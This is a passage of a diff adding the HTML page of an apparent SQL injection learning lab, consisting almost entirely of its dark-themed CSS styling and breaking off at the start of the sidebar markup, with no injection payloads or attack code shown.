@@ -1,0 +1,2676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SQLi Lab — SQL Injection Learning Platform</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+/* ============================================
+   SQLi LAB — Dark Cyber Terminal Aesthetic
+   Fonts: Orbitron (headings) + Share Tech Mono (code)
+   ============================================ */
+
+:root {
+  --bg-base: #080c10;
+  --bg-surface: #0d1117;
+  --bg-card: #111820;
+  --bg-card-hover: #151f2b;
+  --bg-sidebar: #0a0e14;
+  --border: #1e2d3d;
+  --border-glow: #1e4d6b;
+  --accent: #00d4ff;
+  --accent-dim: #0090b0;
+  --accent-glow: rgba(0,212,255,0.15);
+  --green: #39ff14;
+  --green-dim: #1a8c00;
+  --red: #ff3355;
+  --red-dim: #8c0022;
+  --yellow: #ffcc00;
+  --yellow-dim: #7a6100;
+  --orange: #ff6b35;
+  --text-primary: #d0e4f0;
+  --text-secondary: #6a8fa8;
+  --text-muted: #3a5570;
+  --sql-keyword: #569cd6;
+  --sql-string: #ce9178;
+  --sql-inject: #ff3355;
+  --sql-comment: #57a64a;
+  --sql-function: #dcdcaa;
+  --sql-number: #b5cea8;
+  --radius: 6px;
+  --sidebar-width: 270px;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg-base);
+  color: var(--text-primary);
+  font-family: 'Share Tech Mono', monospace;
+  display: flex;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* Scanline overlay */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.05) 2px,
+    rgba(0,0,0,0.05) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ============ SIDEBAR ============ */
+.sidebar {
+  width: var(--sidebar-width);
+  background: var(--bg-sidebar);
+  border-right: 1px solid var(--border);
+  position: fixed;
+  top: 0; left: 0;
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  z-index: 100;
+  transition: transform 0.3s ease;
+  overflow-y: auto;
+}
+
+.sidebar-logo {
+  padding: 24px 20px 8px;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.4rem;
+  font-weight: 900;
+  letter-spacing: 2px;
+  color: var(--accent);
+}
+
+.logo-bracket { color: var(--text-muted); }
+.logo-accent { color: var(--red); }
+
+.sidebar-subtitle {
+  padding: 0 20px 20px;
+  font-size: 0.65rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  border-bottom: 1px solid var(--border);
+}
+
+.sidebar-nav {
+  flex: 1;
+  padding: 16px 0;
+  overflow-y: auto;
+}
+
+.nav-section-label {
+  font-size: 0.6rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  padding: 12px 20px 6px;
+}
+
+.nav-item {
+  width: 100%;
+  background: transparent;
+  border: none;
+  color: var(--text-secondary);
+  padding: 10px 20px;
+  text-align: left;
+  cursor: pointer;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.8rem;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  border-left: 2px solid transparent;
+  transition: all 0.2s;
+  line-height: 1.4;
+}
+
+.nav-item:hover {
+  background: rgba(0,212,255,0.05);
+  color: var(--text-primary);
+  border-left-color: var(--accent-dim);
+}
+
+.nav-item.active {
+  background: rgba(0,212,255,0.08);
+  color: var(--accent);
+  border-left-color: var(--accent);
+}
+
+.nav-icon { font-size: 0.75rem; min-width: 16px; }
+
+.nav-tag {
+  margin-left: auto;
+  font-size: 0.55rem;
+  padding: 2px 5px;
+  border-radius: 3px;
+  background: rgba(0,212,255,0.15);
+  color: var(--accent);
+  border: 1px solid var(--accent-dim);
+  white-space: nowrap;
+}
+
+.tag-hard {
+  background: rgba(255,51,85,0.15);
+  color: var(--red);
+  border-color: var(--red-dim);
+}
+
+.sidebar-footer {
+  padding: 16px 20px;
+  border-top: 1px solid var(--border);
+}
+
+.progress-label {
+  font-size: 0.65rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 8px;
+}
+
+.progress-bar-wrap {
+  background: var(--border);
+  border-radius: 3px;
+  height: 4px;
+  margin-bottom: 6px;
+}
+
+.progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent), var(--green));
+  border-radius: 3px;
+  width: 0%;
+  transition: width 0.5s ease;
+}
+
+.progress-text {
+  font-size: 0.65rem;
+  color: var(--text-muted);
+}
+
+/* ============ HAMBURGER ============ */
+.hamburger {
+  display: none;
+  position: fixed;
+  top: 14px;
+  left: 14px;
+  z-index: 200;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  color: var(--accent);
+  font-size: 1.2rem;
+  padding: 6px 10px;
+  cursor: pointer;
+  border-radius: var(--radius);
+}
+
+/* ============ MAIN CONTENT ============ */
+.main-content {
+  margin-left: var(--sidebar-width);
+  flex: 1;
+  min-height: 100vh;
+  padding: 40px 48px;
+  max-width: 1200px;
+}
+
+/* ============ SECTIONS ============ */
+.section { display: none; }
+.section.active { display: block; animation: fadeIn 0.4s ease; }
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-header {
+  margin-bottom: 36px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 24px;
+}
+
+.section-tag {
+  font-size: 0.65rem;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 3px;
+  margin-bottom: 10px;
+  font-family: 'Orbitron', sans-serif;
+}
+
+.section-header h1 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 2rem;
+  font-weight: 900;
+  color: #fff;
+  line-height: 1.2;
+  margin-bottom: 12px;
+  text-shadow: 0 0 30px rgba(0,212,255,0.3);
+}
+
+.section-desc {
+  font-size: 0.9rem;
+  color: var(--text-secondary);
+  max-width: 700px;
+  line-height: 1.7;
+}
+
+/* ============ CARD GRID ============ */
+.card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 20px;
+  margin-bottom: 36px;
+}
+
+.card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 24px;
+  transition: border-color 0.2s, transform 0.2s;
+}
+
+.card:hover {
+  border-color: var(--border-glow);
+  transform: translateY(-2px);
+}
+
+.card-wide { grid-column: 1 / -1; }
+
+.card-icon { font-size: 1.6rem; margin-bottom: 12px; }
+
+.card h3 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.85rem;
+  color: var(--accent);
+  margin-bottom: 12px;
+  letter-spacing: 1px;
+}
+
+.card p {
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  line-height: 1.7;
+  margin-bottom: 14px;
+}
+
+.card-note {
+  font-size: 0.78rem;
+  color: var(--text-muted);
+  margin-top: 8px;
+  margin-bottom: 0;
+}
+
+.card-defense {
+  border-color: rgba(57,255,20,0.15);
+}
+.card-defense:hover {
+  border-color: rgba(57,255,20,0.35);
+}
+
+/* ============ CODE BLOCKS ============ */
+.code-block {
+  background: #050a0e;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 14px 16px;
+  margin: 12px 0;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.82rem;
+  overflow-x: auto;
+}
+
+.code-block pre {
+  margin: 0;
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.7;
+}
+
+.code-label {
+  font-size: 0.6rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 6px;
+}
+
+/* SQL syntax highlighting */
+.sql-keyword { color: var(--sql-keyword); }
+.sql-string { color: var(--sql-string); }
+.sql-inject { color: var(--sql-inject); font-weight: bold; text-shadow: 0 0 8px rgba(255,51,85,0.5); }
+.sql-comment { color: var(--sql-comment); }
+.sql-function { color: var(--sql-function); }
+.sql-number { color: var(--sql-number); }
+.sql-faded { color: var(--text-muted); text-decoration: line-through; opacity: 0.5; }
+
+code, .inline-code {
+  font-family: 'Share Tech Mono', monospace;
+  background: rgba(0,212,255,0.08);
+  border: 1px solid rgba(0,212,255,0.15);
+  padding: 1px 5px;
+  border-radius: 3px;
+  font-size: 0.82em;
+  color: var(--accent);
+}
+
+/* ============ FLOW / ATTACK VISUAL ============ */
+.flow-arrow-box {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin: 14px 0;
+}
+
+.flow-step {
+  padding: 6px 12px;
+  border-radius: 4px;
+  font-size: 0.75rem;
+  font-weight: bold;
+}
+
+.flow-step.bad {
+  background: rgba(255,51,85,0.1);
+  border: 1px solid rgba(255,51,85,0.3);
+  color: var(--red);
+}
+
+.flow-arrow { color: var(--text-muted); font-size: 1.1rem; }
+
+.query-compare {
+  display: flex;
+  gap: 16px;
+  align-items: flex-start;
+  flex-wrap: wrap;
+  margin: 16px 0;
+}
+
+.query-box { flex: 1; min-width: 240px; }
+
+.query-label {
+  font-size: 0.65rem;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 6px;
+  font-weight: bold;
+}
+
+.good-label { color: var(--green); }
+.bad-label { color: var(--red); }
+
+.query-arrow {
+  font-size: 1.8rem;
+  color: var(--accent);
+  align-self: center;
+  flex-shrink: 0;
+}
+
+/* Attack Flow Diagram */
+.flow-diagram-wrap {
+  margin: 36px 0;
+}
+
+.flow-diagram-wrap h3 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.85rem;
+  color: var(--accent);
+  margin-bottom: 16px;
+  letter-spacing: 1px;
+}
+
+.attack-flow {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 20px;
+  overflow-x: auto;
+}
+
+.af-step {
+  text-align: center;
+  padding: 12px 20px;
+  min-width: 110px;
+}
+
+.af-icon { font-size: 1.8rem; margin-bottom: 6px; }
+.af-label {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.7rem;
+  color: var(--text-primary);
+  margin-bottom: 3px;
+}
+.af-sub { font-size: 0.65rem; color: var(--text-muted); }
+
+.af-step.af-danger { background: rgba(255,51,85,0.08); border-radius: var(--radius); }
+
+.af-arrow { font-size: 1.4rem; color: var(--accent-dim); flex-shrink: 0; }
+
+/* ============ TYPE LIST ============ */
+.type-list { margin-top: 8px; }
+.type-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 7px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+}
+.type-item:last-child { border-bottom: none; }
+
+.type-badge {
+  font-size: 0.65rem;
+  padding: 2px 7px;
+  border-radius: 3px;
+  background: rgba(0,212,255,0.1);
+  color: var(--accent);
+  border: 1px solid rgba(0,212,255,0.2);
+  white-space: nowrap;
+  min-width: 80px;
+  text-align: center;
+}
+
+/* ============ IMPACT LIST ============ */
+.impact-list { margin-top: 8px; }
+.impact-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 6px 0;
+  font-size: 0.82rem;
+  color: var(--text-secondary);
+}
+.impact-icon { font-size: 1rem; }
+
+/* ============ INFO BOX ============ */
+.info-box {
+  background: rgba(0,212,255,0.06);
+  border-left: 3px solid var(--accent);
+  padding: 10px 14px;
+  border-radius: 0 var(--radius) var(--radius) 0;
+  font-size: 0.82rem;
+  color: var(--text-secondary);
+  margin: 12px 0;
+  line-height: 1.6;
+}
+
+.warning-box {
+  background: rgba(255,204,0,0.06);
+  border-left-color: var(--yellow);
+}
+
+/* ============ CTA BANNER ============ */
+.cta-banner {
+  background: linear-gradient(135deg, rgba(0,212,255,0.08), rgba(255,51,85,0.08));
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius);
+  padding: 28px 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+
+.cta-banner p {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.9rem;
+  color: var(--text-primary);
+  margin: 0;
+}
+
+.cta-btn {
+  background: var(--accent);
+  color: #000;
+  border: none;
+  padding: 10px 24px;
+  border-radius: var(--radius);
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.8rem;
+  font-weight: 700;
+  cursor: pointer;
+  letter-spacing: 1px;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+
+.cta-btn:hover {
+  background: #fff;
+  box-shadow: 0 0 20px rgba(0,212,255,0.4);
+}
+
+/* ============ LAB LAYOUT ============ */
+.lab-layout {
+  display: grid;
+  grid-template-columns: 1fr 280px;
+  gap: 28px;
+  align-items: start;
+}
+
+/* ============ STEP TIMELINE ============ */
+.step-timeline { display: flex; flex-direction: column; gap: 0; }
+
+.step-item {
+  display: flex;
+  gap: 18px;
+  opacity: 0.3;
+  pointer-events: none;
+  transition: opacity 0.4s;
+  position: relative;
+}
+
+.step-item::before {
+  content: '';
+  position: absolute;
+  left: 11px;
+  top: 28px;
+  bottom: -24px;
+  width: 1px;
+  background: var(--border);
+}
+
+.step-item:last-child::before { display: none; }
+
+.step-item.active {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.step-item.completed {
+  opacity: 0.7;
+  pointer-events: auto;
+}
+
+.step-dot {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  border: 2px solid var(--border);
+  background: var(--bg-base);
+  flex-shrink: 0;
+  margin-top: 4px;
+  transition: all 0.3s;
+}
+
+.step-item.active .step-dot {
+  border-color: var(--accent);
+  background: var(--accent);
+  box-shadow: 0 0 12px rgba(0,212,255,0.6);
+}
+
+.step-item.completed .step-dot {
+  border-color: var(--green);
+  background: var(--green);
+}
+
+.step-content {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 20px;
+  margin-bottom: 24px;
+  flex: 1;
+}
+
+.step-item.active .step-content {
+  border-color: rgba(0,212,255,0.25);
+}
+
+.step-num {
+  font-size: 0.6rem;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 5px;
+}
+
+.step-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.9rem;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.step-content p {
+  font-size: 0.83rem;
+  color: var(--text-secondary);
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+
+.step-btn {
+  background: transparent;
+  border: 1px solid var(--accent-dim);
+  color: var(--accent);
+  padding: 8px 18px;
+  border-radius: var(--radius);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.8rem;
+  cursor: pointer;
+  margin-top: 12px;
+  transition: all 0.2s;
+  margin-right: 8px;
+}
+
+.step-btn:hover {
+  background: var(--accent-glow);
+  border-color: var(--accent);
+}
+
+.hint-btn {
+  border-color: var(--yellow-dim);
+  color: var(--yellow);
+}
+
+.hint-btn:hover {
+  background: rgba(255,204,0,0.08);
+  border-color: var(--yellow);
+}
+
+.hint-box {
+  margin-top: 12px;
+  background: rgba(255,204,0,0.06);
+  border: 1px solid var(--yellow-dim);
+  border-radius: var(--radius);
+  padding: 10px 14px;
+  font-size: 0.82rem;
+  color: var(--yellow);
+  line-height: 1.7;
+}
+
+/* ============ FAKE BROWSER ============ */
+.fake-browser {
+  background: #050a0e;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin: 14px 0;
+}
+
+.browser-bar {
+  background: #0d1117;
+  border-bottom: 1px solid var(--border);
+  padding: 8px 12px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.browser-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.browser-dot.r { background: #ff5f57; }
+.browser-dot.y { background: #febc2e; }
+.browser-dot.g { background: #28c840; }
+
+.browser-url {
+  background: #0a0f14;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 4px 10px;
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  flex: 1;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.browser-url-input {
+  background: #0a0f14;
+  border: 1px solid var(--border-glow);
+  border-radius: 4px;
+  padding: 4px 10px;
+  font-size: 0.75rem;
+  color: var(--text-primary);
+  flex: 1;
+  font-family: 'Share Tech Mono', monospace;
+  outline: none;
+  min-width: 0;
+}
+
+.browser-url-input:focus { border-color: var(--accent); }
+
+.browser-body { padding: 16px; min-height: 80px; }
+
+/* ============ FAKE PRODUCTS ============ */
+.product-grid {
+  display: flex;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.fake-product {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+  width: 110px;
+}
+
+.fp-img {
+  height: 60px;
+  background: #1a3040;
+}
+
+.fp-name {
+  padding: 6px 8px 2px;
+  font-size: 0.65rem;
+  color: var(--text-primary);
+}
+
+.fp-price {
+  padding: 0 8px 6px;
+  font-size: 0.7rem;
+  color: var(--green);
+}
+
+.fp-unreleased {
+  border-color: rgba(255,51,85,0.3);
+}
+
+.fp-unreleased .fp-name { color: var(--red); }
+
+/* ============ PAYLOAD BUILDER ============ */
+.payload-builder {
+  display: flex;
+  gap: 4px;
+  flex-wrap: wrap;
+  margin: 14px 0;
+}
+
+.payload-part {
+  text-align: center;
+  padding: 10px 14px;
+  border-radius: var(--radius);
+  cursor: help;
+  transition: transform 0.2s;
+}
+
+.payload-part:hover { transform: translateY(-3px); }
+
+.pp-char {
+  font-size: 1rem;
+  font-weight: bold;
+  margin-bottom: 4px;
+}
+
+.pp-label {
+  font-size: 0.6rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  opacity: 0.7;
+}
+
+.p-quote { background: rgba(255,51,85,0.12); border: 1px solid rgba(255,51,85,0.3); color: var(--red); }
+.p-or { background: rgba(255,107,53,0.12); border: 1px solid rgba(255,107,53,0.3); color: var(--orange); }
+.p-comment { background: rgba(87,166,74,0.12); border: 1px solid rgba(87,166,74,0.3); color: var(--sql-comment); }
+.p-string { background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); color: var(--accent); }
+
+/* ============ TERMINAL OUTPUT ============ */
+.terminal-output {
+  background: #050a0e;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 14px;
+  min-height: 100px;
+  font-size: 0.8rem;
+  line-height: 1.8;
+  margin-top: 12px;
+}
+
+.terminal-idle { color: var(--text-muted); font-style: italic; }
+
+/* ============ RESPONSE BOX ============ */
+.response-box {
+  margin: 12px 0;
+  border-radius: var(--radius);
+  overflow: hidden;
+  border: 1px solid var(--border);
+}
+
+.resp-label {
+  background: #0d1117;
+  padding: 6px 12px;
+  font-size: 0.6rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  border-bottom: 1px solid var(--border);
+}
+
+.resp-body {
+  padding: 12px 14px;
+  font-size: 0.82rem;
+  line-height: 1.7;
+}
+
+.resp-body.error {
+  background: rgba(255,51,85,0.06);
+  color: var(--red);
+  border-left: 3px solid var(--red);
+}
+
+.resp-body.success {
+  background: rgba(57,255,20,0.05);
+  color: var(--green);
+  border-left: 3px solid var(--green);
+}
+
+/* ============ COLUMN TESTER ============ */
+.column-tester { margin: 14px 0; }
+
+.ct-row {
+  display: flex;
+  gap: 12px;
+  align-items: center;
+  padding: 8px;
+  border-radius: var(--radius);
+  margin-bottom: 6px;
+  flex-wrap: wrap;
+}
+
+.success-row { background: rgba(57,255,20,0.04); }
+
+.ct-payload {
+  font-size: 0.78rem;
+  color: var(--text-primary);
+  flex: 1;
+  min-width: 200px;
+}
+
+.ct-result {
+  font-size: 0.78rem;
+  padding: 3px 10px;
+  border-radius: 4px;
+  white-space: nowrap;
+}
+
+.error-result {
+  background: rgba(255,51,85,0.1);
+  color: var(--red);
+  border: 1px solid rgba(255,51,85,0.2);
+}
+
+.success-result {
+  background: rgba(57,255,20,0.1);
+  color: var(--green);
+  border: 1px solid rgba(57,255,20,0.2);
+}
+
+/* ============ QUIZ ============ */
+.quiz-container {
+  background: var(--bg-surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 18px;
+}
+
+.quiz-q {
+  font-size: 0.85rem;
+  color: var(--text-primary);
+  margin-bottom: 14px;
+  line-height: 1.6;
+}
+
+.quiz-options { display: flex; flex-direction: column; gap: 8px; }
+
+.quiz-opt {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  color: var(--text-secondary);
+  padding: 10px 14px;
+  border-radius: var(--radius);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.8rem;
+  text-align: left;
+  cursor: pointer;
+  transition: all 0.2s;
+  line-height: 1.5;
+}
+
+.quiz-opt:hover { border-color: var(--accent-dim); color: var(--text-primary); }
+.quiz-opt.correct { border-color: var(--green); background: rgba(57,255,20,0.08); color: var(--green); }
+.quiz-opt.wrong { border-color: var(--red); background: rgba(255,51,85,0.08); color: var(--red); }
+
+.quiz-result {
+  margin-top: 12px;
+  font-size: 0.82rem;
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  min-height: 0;
+  line-height: 1.6;
+}
+
+.quiz-result.correct { background: rgba(57,255,20,0.08); color: var(--green); border: 1px solid rgba(57,255,20,0.2); }
+.quiz-result.wrong { background: rgba(255,51,85,0.08); color: var(--red); border: 1px solid rgba(255,51,85,0.2); }
+
+/* ============ LAB INFO PANEL ============ */
+.lab-info-panel { position: sticky; top: 24px; }
+
+.info-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 16px;
+  margin-bottom: 14px;
+}
+
+.info-card-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.7rem;
+  color: var(--accent);
+  letter-spacing: 1px;
+  margin-bottom: 10px;
+  text-transform: uppercase;
+}
+
+.info-card p {
+  font-size: 0.82rem;
+  color: var(--text-secondary);
+  line-height: 1.6;
+}
+
+.impact-ul {
+  list-style: none;
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  line-height: 2;
+}
+
+.impact-ul li::before { content: '▸ '; color: var(--accent); }
+.impact-ul.ordered { list-style: decimal; list-style-position: inside; }
+.impact-ul.ordered li::before { display: none; }
+
+/* ============ FAKE LOGIN ============ */
+.fake-login-form {
+  background: var(--bg-surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 24px;
+  max-width: 400px;
+}
+
+.login-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  color: var(--accent);
+  margin-bottom: 18px;
+  text-align: center;
+}
+
+.form-group {
+  margin-bottom: 14px;
+}
+
+.form-group label {
+  display: block;
+  font-size: 0.72rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 5px;
+}
+
+.fake-input {
+  width: 100%;
+  background: #050a0e;
+  border: 1px solid var(--border);
+  color: var(--text-primary);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.85rem;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.fake-input:focus { border-color: var(--accent); }
+
+.login-btn {
+  width: 100%;
+  background: var(--accent);
+  color: #000;
+  border: none;
+  padding: 10px;
+  border-radius: var(--radius);
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.8rem;
+  font-weight: 700;
+  cursor: pointer;
+  margin-top: 4px;
+  letter-spacing: 1px;
+  transition: all 0.2s;
+}
+
+.login-btn:hover { background: #fff; box-shadow: 0 0 16px rgba(0,212,255,0.4); }
+
+.login-result {
+  margin-top: 12px;
+  font-size: 0.82rem;
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  min-height: 0;
+  line-height: 1.6;
+}
+
+.login-result.success-msg {
+  background: rgba(57,255,20,0.08);
+  color: var(--green);
+  border: 1px solid rgba(57,255,20,0.2);
+}
+
+.login-result.error-msg {
+  background: rgba(255,51,85,0.08);
+  color: var(--red);
+  border: 1px solid rgba(255,51,85,0.2);
+}
+
+/* ============ BADGE ============ */
+.lab-complete-badge {
+  background: linear-gradient(135deg, rgba(57,255,20,0.1), rgba(0,212,255,0.1));
+  border: 1px solid rgba(57,255,20,0.3);
+  border-radius: var(--radius);
+  padding: 20px;
+  text-align: center;
+  animation: pulse-border 2s infinite;
+}
+
+@keyframes pulse-border {
+  0%, 100% { box-shadow: 0 0 8px rgba(57,255,20,0.2); }
+  50% { box-shadow: 0 0 20px rgba(57,255,20,0.5); }
+}
+
+.badge-icon { font-size: 2rem; margin-bottom: 6px; }
+.badge-text {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.75rem;
+  color: var(--green);
+  letter-spacing: 2px;
+}
+
+/* ============ ATTACK CHAIN VISUAL ============ */
+.attack-chain-visual {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  margin-bottom: 24px;
+  overflow-x: auto;
+  padding: 16px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+}
+
+.ac-step {
+  text-align: center;
+  font-size: 0.65rem;
+  color: var(--text-muted);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  border: 1px solid var(--border);
+  min-width: 80px;
+  transition: all 0.3s;
+  flex-shrink: 0;
+  line-height: 1.5;
+}
+
+.ac-step span {
+  display: block;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.9rem;
+  font-weight: 900;
+  margin-bottom: 3px;
+  color: var(--text-muted);
+}
+
+.ac-step.done {
+  border-color: var(--green);
+  background: rgba(57,255,20,0.08);
+  color: var(--green);
+}
+
+.ac-step.done span { color: var(--green); }
+
+.ac-step.active-chain {
+  border-color: var(--accent);
+  background: rgba(0,212,255,0.08);
+  color: var(--accent);
+  box-shadow: 0 0 12px rgba(0,212,255,0.3);
+}
+
+.ac-step.active-chain span { color: var(--accent); }
+
+.ac-line {
+  height: 2px;
+  width: 24px;
+  background: var(--border);
+  flex-shrink: 0;
+  transition: background 0.3s;
+}
+
+/* ============ CREDENTIAL DUMP ============ */
+.cred-dump {
+  font-family: 'Share Tech Mono', monospace;
+}
+
+.cred-row {
+  display: flex;
+  gap: 20px;
+  padding: 4px 0;
+  border-bottom: 1px solid rgba(57,255,20,0.1);
+}
+
+.cred-row.header-row {
+  color: var(--text-muted);
+  font-size: 0.7rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  padding-bottom: 8px;
+  margin-bottom: 4px;
+}
+
+.cred-row span { flex: 1; }
+.cred-pass { color: var(--yellow); }
+
+/* ============ PAYLOAD SELECTOR ============ */
+.payload-select {
+  width: 100%;
+  background: #050a0e;
+  border: 1px solid var(--border-glow);
+  color: var(--text-primary);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.82rem;
+  cursor: pointer;
+  outline: none;
+}
+
+.payload-select:focus { border-color: var(--accent); }
+
+/* ============ CODE COMPARE ============ */
+.code-compare {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin: 14px 0;
+}
+
+/* ============ PREVENTION SUMMARY ============ */
+.final-summary {
+  margin-top: 36px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 28px;
+}
+
+.final-summary h3 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  color: var(--accent);
+  margin-bottom: 20px;
+  letter-spacing: 1px;
+}
+
+.summary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+  gap: 12px;
+}
+
+.summary-item {
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+  background: var(--bg-surface);
+  padding: 12px;
+  border-radius: var(--radius);
+  border: 1px solid var(--border);
+}
+
+.si-icon { font-size: 1.3rem; flex-shrink: 0; }
+.si-text { font-size: 0.8rem; color: var(--text-secondary); line-height: 1.5; }
+.si-text strong { color: var(--text-primary); }
+
+/* ============ ANIMATED QUERY ============ */
+.animated-query { animation: glow-in 1s ease; }
+
+@keyframes glow-in {
+  from { box-shadow: 0 0 0 rgba(0,212,255,0); }
+  50% { box-shadow: 0 0 16px rgba(0,212,255,0.3); }
+  to { box-shadow: 0 0 4px rgba(0,212,255,0.1); }
+}
+
+/* ============ RESPONSIVE ============ */
+@media (max-width: 900px) {
+  .sidebar {
+    transform: translateX(-100%);
+  }
+  .sidebar.open {
+    transform: translateX(0);
+  }
+  .hamburger { display: block; }
+  .main-content {
+    margin-left: 0;
+    padding: 60px 20px 32px;
+  }
+  .lab-layout {
+    grid-template-columns: 1fr;
+  }
+  .lab-info-panel { position: static; }
+  .card-grid { grid-template-columns: 1fr; }
+  .query-compare { flex-direction: column; }
+  .query-arrow { transform: rotate(90deg); }
+  .code-compare { grid-template-columns: 1fr; }
+  .cta-banner { flex-direction: column; }
+  .attack-flow { flex-direction: column; }
+  .af-arrow { transform: rotate(90deg); }
+}
+
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-logo">
+    <span class="logo-bracket">[</span>
+    <span class="logo-text">SQLi<span class="logo-accent">LAB</span></span>
+    <span class="logo-bracket">]</span>
+  </div>
